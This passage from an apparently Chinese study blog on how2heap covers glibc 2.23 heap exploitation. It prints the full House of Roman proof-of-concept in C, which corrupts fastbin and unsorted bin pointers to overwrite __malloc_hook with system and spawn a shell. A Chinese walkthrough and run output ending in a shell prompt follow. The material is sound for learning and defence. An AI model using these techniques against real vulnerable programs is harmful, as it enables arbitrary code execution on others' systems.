<p>最后malloc(0x10)的时候unsorted bin 被改掉了当 malloc 的时候会出错<code> malloc_printerr-&gt;__libc_message-&gt;abort()-&gt;_IO_flush_all_lockp()</code> <code>_IO_flush_all_lockp() </code>的时候需要在 vtable 中找<code> _IO_OVERFLOW</code>，这个刚好被我们覆盖成system所以可以直接getshell。</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).</span><br><span class="line">Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><br><span class="line">*** Error in `./exp': malloc(): memory corruption: 0x00007ffff7dd2520 ***</span><br><span class="line">$ ls</span><br><span class="line">exp  exp.c</span><br><span class="line">$ </span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-roman-无show函数"><a href="#house-of-roman-无show函数" class="headerlink" title="house_of_roman(无show函数)"></a>house_of_roman(无show函数)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">"/bin/sh\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.</span></span><br><span class="line"><span class="comment">Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment">POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this in order to turn off printf buffering (messes with heap alignment)</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">init</span><span class="params">()</span>{</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* introduction = <span class="string">"\nWelcome to the House of Roman\n\n"</span></span><br><span class="line">			     <span class="string">"This is a heap exploitation technique that is LEAKLESS.\n"</span></span><br><span class="line">			     <span class="string">"There are three stages to the attack: \n\n"</span></span><br><span class="line">			     <span class="string">"1. Point a fastbin chunk to __malloc_hook.\n"</span></span><br><span class="line">			     <span class="string">"2. Run the unsorted_bin attack on __malloc_hook.\n"</span></span><br><span class="line">			     <span class="string">"3. Relative overwrite on main_arena at __malloc_hook.\n\n"</span></span><br><span class="line">			     <span class="string">"All of the stuff mentioned above is done using two main concepts:\n"</span></span><br><span class="line">                             <span class="string">"relative overwrites and heap feng shui.\n\n"</span></span><br><span class="line">			     <span class="string">"However, this technique comes at a cost:\n"</span></span><br><span class="line">                             <span class="string">"12-bits of entropy need to be brute forced.\n"</span></span><br><span class="line">			     <span class="string">"That means this technique only work 1 out of every 4096 tries or 0.02%.\n"</span></span><br><span class="line">			     <span class="string">"**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n"</span>;</span><br><span class="line">	<span class="built_in">puts</span>(introduction);	</span><br><span class="line">	init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Step 1: Point fastbin chunk to __malloc_hook\n\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Setting up chunks for relative overwrites with heap feng shui.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	</span></span><br><span class="line">	<span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line"></span><br><span class="line">	<span class="comment">// Allocate this in order to have good alignment for relative </span></span><br><span class="line">	<span class="comment">// offsets later (only want to overwrite a single byte to prevent </span></span><br><span class="line">	<span class="comment">// 4 bits of brute on the heap).</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Offset 0x100</span></span><br><span class="line">	<span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Offset 0x190</span></span><br><span class="line">	<span class="comment">// This ptr will be used for a relative offset on the 'main_arena_use' chunk</span></span><br><span class="line">	<span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Free the chunk to put it into the unsorted_bin. </span></span><br><span class="line">	<span class="comment">// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.</span></span><br><span class="line">	<span class="built_in">free</span>(main_arena_use);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Get part of the unsorted_bin chunk (the one that we just freed). </span></span><br><span class="line"><span class="comment">	We want this chunk because the fd and bk of this chunk will </span></span><br><span class="line"><span class="comment">	contain main_arena ptrs (used for relative overwrite later).</span></span><br><span class="line"><span class="comment">	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. </span></span><br><span class="line"><span class="comment">	This has to be the same size because the __malloc_hook fake </span></span><br><span class="line"><span class="comment">	chunk (used later) uses the fastbin size of 0x7f. There is</span></span><br><span class="line"><span class="comment">	 a security check (within malloc) that the size of the chunk matches the fastbin size.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n"</span>);</span><br><span class="line"><span class="comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//// <span class="doctag">NOTE:</span> This is NOT part of the exploit... \\\</span></span><br><span class="line"><span class="comment">	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. </span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - <span class="number">0xe8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// We need the filler because the overwrite below needs </span></span><br><span class="line">	<span class="comment">// to have a ptr in the fd slot in order to work. </span></span><br><span class="line">	<span class="comment">//Freeing this chunk puts a chunk in the fd slot of 'fastbin_victim' to be used later. </span></span><br><span class="line">	<span class="built_in">free</span>(relative_offset_heap);	</span><br><span class="line"></span><br><span class="line">    	<span class="comment">/* </span></span><br><span class="line"><span class="comment">    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim </span></span><br><span class="line"><span class="comment">	points to is currently at the offset 0x190 (heap_relative_offset).</span></span><br><span class="line"><span class="comment">     	*/</span></span><br><span class="line">	<span class="built_in">free</span>(fastbin_victim);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\</span></span><br><span class="line"><span class="string">Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\</span></span><br><span class="line"><span class="string">to the chunk with the LibC address\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\</span></span><br><span class="line"><span class="string">Fastbin 0x70 now looks like this:\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n"</span>);</span><br><span class="line">	fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\</span></span><br><span class="line"><span class="string">Use a relative overwrite on the main_arena pointer in the fastbin.\n\</span></span><br><span class="line"><span class="string">Point this close to __malloc_hook in order to create a fake fastbin chunk\n"</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The relative overwrite</span></span><br><span class="line">	<span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	<span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">	fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// Least significant bytes of the address.</span></span><br><span class="line">	fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// The upper most 4 bits of this must be brute forced in a real attack.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Two filler chunks prior to the __malloc_hook chunk in the fastbin. </span></span><br><span class="line">	<span class="comment">// These are fastbin_victim and fake_libc_chunk.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Get the fake chunk pointing close to __malloc_hook\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\</span></span><br><span class="line"><span class="string">In a real exploit, this would fail 15/16 times\n\</span></span><br><span class="line"><span class="string">because of the final half byet of the malloc_hook being random\n"</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If the 4 bit brute force did not work, this will crash because </span></span><br><span class="line">	<span class="comment">// of the chunk size not matching the bin for the chunk. </span></span><br><span class="line">	<span class="comment">// Otherwise, the next step of the attack can begin.</span></span><br><span class="line">	<span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Passed step 1 =)\n\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\</span></span><br><span class="line"><span class="string">Start Step 2: Unsorted_bin attack\n\n\</span></span><br><span class="line"><span class="string">The unsorted bin attack gives us the ability to write a\n\</span></span><br><span class="line"><span class="string">large value to ANY location. But, we do not control the value\n\</span></span><br><span class="line"><span class="string">This value is always main_arena + 0x68. \n\</span></span><br><span class="line"><span class="string">We point the unsorted_bin attack to __malloc_hook for a \n\</span></span><br><span class="line"><span class="string">relative overwrite later.\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// Don't want to consolidate</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Put chunk into unsorted_bin\n"</span>);</span><br><span class="line">	<span class="comment">// Free the chunk to create the UAF</span></span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* /// <span class="doctag">NOTE:</span> The last 4 bits of byte2 would have been brute forced earlier. \\\ </span></span><br><span class="line"><span class="comment">	 However, for the sake of example, this has been calculated dynamically. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	__malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// This subtract 0x10 is needed because of the chunk-&gt;fd doing the actual overwrite on the unsorted_bin attack.</span></span><br><span class="line">	byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use another relative offset to overwrite the ptr of the chunk-&gt;bk pointer.</span></span><br><span class="line">	<span class="comment">// From the previous brute force (4 bits from before) we </span></span><br><span class="line">	<span class="comment">// know where the location of this is at. It is 5 bytes away from __malloc_hook.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Overwrite last two bytes of the chunk to point to __malloc_hook\n"</span>);</span><br><span class="line">	unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// Byte 0 of bk. 	</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// //// <span class="doctag">NOTE:</span> Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///</span></span><br><span class="line">	unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Trigger the unsorted_bin attack\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68</span></span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)dlsym(RTLD_NEXT, <span class="string">"system"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Passed step 2 =)\n\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Step 3: Set __malloc_hook to system/one_gadget\n\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\</span></span><br><span class="line"><span class="string">Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\</span></span><br><span class="line"><span class="string">we can use a relative overwrite to point this to system or a one_gadget.\n\</span></span><br><span class="line"><span class="string">Note: In a real attack, this would be where the last 8 bits of brute forcing\n\</span></span><br><span class="line"><span class="string">comes from.\n"</span>);</span><br><span class="line">	malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// The first 12 bits are static (per version).</span></span><br><span class="line"></span><br><span class="line">	malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last 4 bits of this must be brute forced (done previously already).</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last byte is the remaining 8 bits that must be brute forced.</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Pop Shell!"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line">		</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>上面的注释太大了有点占位置了，这里删除了一些想要看注释的直接去how2heap那里看即可。这是一种无泄漏的堆利用技术，在没有show这一类可以输出libc的函数下可以尝试使用些攻击手法。分为三步</p>
<blockquote>
<ol>
<li>通过低位地址改写使 fastbin chunk 的 fd 指针指向 __malloc_hook</li>
<li>通过 unsortedbin attack 把 main_arena 写到 malloc_hook 上</li>
<li>通过低位地址修改 __malloc_hook 为 one_gadget</li>
</ol>
</blockquote>
<p>首先创建了四个堆块0x60 0x80 0x80 0x60，记为chunk1，chunk2，chunk3，chunk4。然后释放了chunk3，此时chunk3会进入unsortedbin中。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/35.png"></p>
<p>这个时候再申请比0x80小的chunk会将unsortedbin给分割，所以申请了0x60(chunk5)。接着通过chunk5的fd拿到malloc_hook的地址</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/37.png"></p>
<p>释放chunk4再释放chunk1，此时的bin中应该是chunk1-&gt;chunk4</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/38.png"></p>
<p>chunk1 的 fd 指针最后一个字节改为0,些时chunk1的fd就是chunk5的地址，chunk5的fd又是main_arena。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/39.png"></p>
<p>因为chunk5并没有被释放掉，所以我们还可以改chunk5的fd，改为malloc_hook - 0x23，因为需要过2.23下的size检测。再一路申请到malloc_hook - 0x23，malloc_hook - 0x23这里用malloc_hook_chunk来表示。至此第一步结束</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/40.png"></p>
<p>第二步开始，unsortedbin attack。</p>
<p>分配一个0x80大小的chunk6，再分配一个大小0x30的chunk7，chunk7是为了防止chunk6与top_chunk合并。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/41.png"></p>
<p>将chunk6释放掉，此时chunk6会进入unsortedbin中，因为要使用unsortedbin attack。再将chunk6的bk给改成malloc_hook - 0x10</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/42.png"></p>
<p>申请一个0x80大小的chunk8触发unsortedbin attack，可以看到malloc_hook的值因为unsortedbin attack被改成了main_arena+88，至此第二步完成</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/43.png"></p>
<p>第三步开始，第一步中在malloc_hook - 0x23这里是malloc_hook_chunk。通过修改malloc_hook_chunk这个堆块里的值（也就是__malloc_hook）改成system或者one_gadget就可以getshell了。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/44.png"></p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Roman</span><br><span class="line"></span><br><span class="line">This is a heap exploitation technique that is LEAKLESS.</span><br><span class="line">There are three stages to the attack: </span><br><span class="line"></span><br><span class="line">1. Point a fastbin chunk to __malloc_hook.</span><br><span class="line">2. Run the unsorted_bin attack on __malloc_hook.</span><br><span class="line">3. Relative overwrite on main_arena at __malloc_hook.</span><br><span class="line"></span><br><span class="line">All of the stuff mentioned above is done using two main concepts:</span><br><span class="line">relative overwrites and heap feng shui.</span><br><span class="line"></span><br><span class="line">However, this technique comes at a cost:</span><br><span class="line">12-bits of entropy need to be brute forced.</span><br><span class="line">That means this technique only work 1 out of every 4096 tries or 0.02%.</span><br><span class="line">**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Step 1: Point fastbin chunk to __malloc_hook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Setting up chunks for relative overwrites with heap feng shui.</span><br><span class="line"></span><br><span class="line">Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.</span><br><span class="line"></span><br><span class="line">Overwrite the first byte of a heap chunk in order to point the fastbin chunk</span><br><span class="line">to the chunk with the LibC address</span><br><span class="line"></span><br><span class="line">Fastbin 0x70 now looks like this:</span><br><span class="line">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena</span><br><span class="line"></span><br><span class="line">Use a relative overwrite on the main_arena pointer in the fastbin.</span><br><span class="line">Point this close to __malloc_hook in order to create a fake fastbin chunk</span><br><span class="line"></span><br><span class="line">Get the fake chunk pointing close to __malloc_hook</span><br><span class="line"></span><br><span class="line">In a real exploit, this would fail 15/16 times</span><br><span class="line">because of the final half byet of the malloc_hook being random</span><br><span class="line"></span><br><span class="line">Passed step 1 =)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Start Step 2: Unsorted_bin attack</span><br><span class="line"></span><br><span class="line">The unsorted bin attack gives us the ability to write a</span><br><span class="line">large value to ANY location. But, we do not control the value</span><br><span class="line">This value is always main_arena + 0x68. </span><br><span class="line">We point the unsorted_bin attack to __malloc_hook for a </span><br><span class="line">relative overwrite later.</span><br><span class="line"></span><br><span class="line">Put chunk into unsorted_bin</span><br><span class="line"></span><br><span class="line">Overwrite last two bytes of the chunk to point to __malloc_hook</span><br><span class="line"></span><br><span class="line">Trigger the unsorted_bin attack</span><br><span class="line"></span><br><span class="line">Passed step 2 =)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Step 3: Set __malloc_hook to system/one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Now that we have a pointer to LibC inside of __malloc_hook (from step 2), </span><br><span class="line">we can use a relative overwrite to point this to system or a one_gadget.</span><br><span class="line">Note: In a real attack, this would be where the last 8 bits of brute forcing</span><br><span class="line">comes from.</span><br><span class="line"></span><br><span class="line">Pop Shell!</span><br><span class="line">$ ls</span><br><span class="line">exp  exp.c</span><br><span class="line">$ </span><br></pre></td></tr></tbody></table></figure>

